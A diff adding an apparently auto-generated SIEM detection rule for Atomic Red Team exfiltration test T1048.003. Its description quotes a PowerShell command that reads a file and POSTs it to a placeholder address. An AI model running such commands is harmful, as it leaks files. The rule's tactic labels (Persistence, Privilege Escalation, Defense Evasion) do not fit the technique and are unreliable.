@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Exfiltration Over Alternative Protocol - HTTP' (GUID: 6aa58451-1121-4490-a8e9-1dada3f1c68c) of technique T1048.003 (Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol). Test Description: Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.. Command/Steps: $content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n"
+from = "now-9m"
+rule_id = "f5175ec2-df6d-476d-a411-86b1ff2fe9fb"
+language = "kql"
+name = "Atomic Test: T1048.003 - Exfiltration Over Alternative Protocol - HTTP"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048.003/T1048.003.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1048.003", "6aa58451-1121-4490-a8e9-1dada3f1c68c", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*$content*\\\" AND powershell.script_block_text : \\\"*Get-Content*\\\" AND powershell.script_block_text : \\\"*C:\\\\Windows\\\\System32\\\\notepad.exe*\\\" OR (process.command_line : \\\"*$content*\\\" AND process.command_line : \\\"*Get-Content*\\\" AND process.command_line : \\\"*C:\\\\Windows\\\\System32\\\\notepad.exe*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1048.003"
+name = "Exfiltration Over Alternative Protocol - HTTP"
+reference = "https://attack.mitre.org/techniques/T1048/003"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1048/003"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1048/003"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1048/003"
+
+
